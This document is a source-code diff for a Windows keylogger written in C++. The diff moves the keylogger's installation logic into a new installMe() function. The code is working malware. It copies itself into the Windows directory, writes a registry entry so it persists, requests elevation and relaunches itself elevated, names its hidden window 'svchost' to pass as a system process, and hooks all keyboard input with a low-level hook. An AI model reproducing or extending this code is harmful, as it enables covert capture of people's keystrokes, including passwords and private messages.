@@ -3,33 +3,26 @@
 
 LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+int installMe();
 BOOL isMyFirstRun();
 BOOL IsRunAsAdmin();
-int makeMeAdmin( HWND hWnd );
+int makeMeAdmin();
 long createRegistry( LPCTSTR data );
 
+HWND hwnd;
+MSG msg;
+WNDCLASSEX wndcls;
 Logger* logger;
 
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int iCmdShow)
-
 {
-	HWND hwnd;
-	MSG msg;
-	WNDCLASSEX wndcls;
-	ERROR_SUCCESS;
 	const char g_szClassName[] = "michifu";
-	char* destination = (char*)malloc(sizeof(char) * MAX_PATH);
-	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
 	char* logPath = (char*)malloc(sizeof(char) * MAX_PATH);
 
 	strcpy(logPath, std::getenv("LOCALAPPDATA") );
 	strcat(logPath, LOG_FILE_NAME );
 	logger = new Logger( logPath );
-
-	strcpy(destination, std::getenv("WINDIR"));
-	strcat(destination, KEYLOG_NAME);
-	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH);
 
 	wndcls.cbSize = sizeof(WNDCLASSEX);
 	wndcls.style = CS_HREDRAW | CS_VREDRAW;
@@ -47,15 +40,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInst, PSTR szCmdLine, int
 	( RegisterClassEx(&wndcls) ) ? logger->write("[ register class SUCCESS ]\n") : logger->write("[ register class FAIL ]\n");
 	hwnd = CreateWindowEx(NULL,	g_szClassName, "svchost", NULL, 0, 0, 0, 0,	NULL, NULL, hInstance, NULL);
 
-	if (isMyFirstRun()) {
-		logger->write("[ first Run ]\n");
-		if (!IsRunAsAdmin()) makeMeAdmin(hwnd);
-		logger->write("[ installing keylogger ]\n"); 
-		(CopyFile(iam, destination, 0)) ? logger->write("[ copy SUCCESS ]\n") : logger->write("[ copy FAIL ]\n");
-		(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register SUCCESS ]\n") : logger->write("[ register FAIL ]");
-	}
-	else
-		logger->write("[ keylogger already installed ]\n");
+	(isMyFirstRun())? installMe() : logger->write("[ keylogger already installed ]\n");
 	  
 	HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
 	(hhkLowLevelKybd != NULL) ? logger->write("[ hook SUCCESS ]\n") : logger->write("[ hook FAIL ]\n");
@@ -246,7 +231,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	return(CallNextHookEx(NULL, nCode, wParam, lParam));
 }
 
-
 LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 {
 	switch (iMsg)
@@ -262,6 +246,34 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT iMsg, WPARAM wParam, LPARAM lParam)
 	}
 }
 
+int installMe() {
+	char* destination = (char*)malloc(sizeof(char) * MAX_PATH);
+	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
+
+	strcpy(destination, std::getenv("WINDIR"));
+	strcat(destination, KEYLOG_NAME);
+	GetModuleFileName(NULL, iam, sizeof(char)*MAX_PATH);
+
+	logger->write("[ first Run ]\n");
+	if (!IsRunAsAdmin())
+		if (makeMeAdmin() == -1)
+			logger->write("[ admin REFUSE ]"); // improve to install for current user
+
+	logger->write("[ installing keylogger ]\n");
+	(CopyFile(iam, destination, 0)) ? logger->write("[ copy SUCCESS ]\n") : logger->write("[ copy FAIL ]\n");
+	(createRegistry(destination) == ERROR_SUCCESS) ? logger->write("[ register SUCCESS ]\n") : logger->write("[ register FAIL ]");
+
+	SHELLEXECUTEINFO sei = { sizeof(sei) };
+	sei.lpVerb = "runas";
+	sei.lpFile = destination;
+	sei.hwnd = hwnd;
+	sei.nShow = SW_NORMAL;
+
+	(ShellExecuteEx(&sei) )? logger->write("[ expanding child SUCCESS ]\n"): logger->write("[ expanding child FAIL ]\n");
+	DestroyWindow(hwnd);
+
+	return 0;
+}
 
 BOOL IsRunAsAdmin()
 {
@@ -317,7 +329,7 @@ BOOL isMyFirstRun() {
 		return FALSE;
 }
 
-int makeMeAdmin(HWND hwnd) {
+int makeMeAdmin() {
 
 	char* iam = (char*)malloc(sizeof(char) * MAX_PATH);
 
@@ -333,12 +345,9 @@ int makeMeAdmin(HWND hwnd) {
 		if (!ShellExecuteEx(&sei))
 		{
 			DWORD dwError = GetLastError();
-			if (dwError == ERROR_CANCELLED)
-			{
-				// The user refused the elevation.
-				// Do nothing ...
-				logger->write("REFUSE ADMIN");
-			}
+			if (dwError == ERROR_CANCELLED) return -1;
+			// The user refused the elevation.
+			// improve to install for HKCU 
 		}
 		else
 			DestroyWindow(hwnd);  // Quit itself
